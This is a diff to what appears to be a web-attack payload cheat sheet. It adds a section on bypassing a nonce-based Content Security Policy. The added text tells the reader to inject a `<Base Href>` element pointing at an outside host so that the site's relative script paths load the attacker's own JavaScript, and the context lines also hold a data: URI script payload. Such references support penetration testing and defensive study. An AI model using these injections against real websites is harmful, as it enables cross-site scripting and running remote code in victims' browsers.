@@ -81,6 +81,7 @@
     - [Bypass CSP by Rhynorater](#bypass-csp-by-rhynorater)
     - [Bypass CSP by @akita_zen](#bypass-csp-by-akita_zen)
     - [Bypass CSP by @404death](#bypass-csp-by-404death)
+    - [Bypass CSP nonce by @PolLamothe](#bypass-csp-nonce-by-pollamothe)
   - [Common WAF Bypass](#common-waf-bypass)
     - [Cloudflare XSS Bypasses by @Bohdan Korzhynskyi](#cloudflare-xss-bypasses-by-bohdan-korzhynskyi)
       - [25st January 2021](#25st-january-2021)
@@ -1148,6 +1149,20 @@ Works for CSP like `script-src 'self' data:` as warned about in the official [mo
 <script src="data:,alert(1)">/</script>
 ```
 
+### Bypass CSP nonce by [@PolLamothe](https://github.com/PolLamothe)
+
+Works for CSP like `script-src 'nonce-RANDOM_NONCE'`
+
+**This can work only if the site has a js file imported with a path that don't include the URL**. Like this : `<script src='/PATH.js'></script>`
+
+You have to inject this html element :
+```html
+<Base Href=http://www.yoursite.com>
+```
+
+Now you have to host your custom js file at the same path that one of the website's script. 
+
+So the site will use this js file : `http://www.yoursite.com/PATH.js`
 
 ## Common WAF Bypass
 
